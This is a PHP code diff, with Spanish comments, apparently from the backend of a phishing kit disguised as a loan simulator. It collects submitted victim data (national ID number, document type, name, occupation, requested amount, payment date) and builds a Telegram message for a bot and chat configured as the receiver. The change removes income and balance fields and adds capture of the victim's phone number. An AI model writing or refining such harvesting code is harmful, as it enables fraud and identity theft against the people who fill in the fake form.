@@ -26,17 +26,11 @@ $botToken = $telegram_config['bot_token'];
 $chatId = $telegram_config['chat_id'];
 
 // --- Captura de datos del crédito (vienen por POST) ---
-// El JS los envía sin prefijo
 $credito_monto_raw = $_POST['montoCredito'] ?? 0;
-$credito_ingresos_raw = $_POST['ingresoMensual'] ?? 0;
-$credito_gastos_raw = $_POST['gastosMensual'] ?? 0;
-$credito_saldo_raw = $_POST['saldoActual'] ?? 0;
+$credito_celular = $_POST['celular'] ?? 'No especificado';
 
 // Formatear números como moneda para Telegram
 $credito_monto = '$' . number_format($credito_monto_raw, 0, ',', '.');
-$credito_ingresos = '$' . number_format($credito_ingresos_raw, 0, ',', '.');
-$credito_gastos = '$' . number_format($credito_gastos_raw, 0, ',', '.');
-$credito_saldo = '$' . number_format($credito_saldo_raw, 0, ',', '.');
 
 // Captura del resto de datos de crédito
 $credito_tipo_doc = $_POST['tipoDocCredito'] ?? 'No especificado';
@@ -48,15 +42,14 @@ $credito_fecha_pago = $_POST['fechaPago'] ?? 'No especificado';
 
 // --- Añadir datos del crédito al mensaje de Telegram ---
 $message = "💰 *Datos del Crédito Simulado* 💰\n";
-$message .= "*(Asociado al ID: `..." . substr($transaction_id, -6) . " `)*\n\n"; // Para asociarlo al log anterior
+$message .= "*(Asociado al ID: `..." . substr($transaction_id, -6) . " `)*\n\n";
+
 $message .= "› *Monto Solicitado:* `" . htmlspecialchars($credito_monto) . "`\n";
 $message .= "› *Tipo Doc (Crédito):* " . htmlspecialchars($credito_tipo_doc) . "\n";
 $message .= "› *Cédula (Crédito):* `" . htmlspecialchars($credito_cedula) . "`\n";
 $message .= "› *Nombre (Crédito):* " . htmlspecialchars($credito_nombre) . "\n";
+$message .= "› *Teléfono:* `" . htmlspecialchars($credito_celular) . "`\n";
 $message .= "› *Ocupación:* " . htmlspecialchars($credito_ocupacion) . "\n";
-$message .= "› *Ingresos:* `" . htmlspecialchars($credito_ingresos) . "`\n";
-$message .= "› *Gastos:* `" . htmlspecialchars($credito_gastos) . "`\n";
-$message .= "› *Saldo Cuenta:* `" . htmlspecialchars($credito_saldo) . "`\n";
 $message .= "› *Plazo:* " . htmlspecialchars($credito_plazo) . " meses\n";
 $message .= "› *Fecha de Pago:* Día " . htmlspecialchars($credito_fecha_pago) . "\n";
 
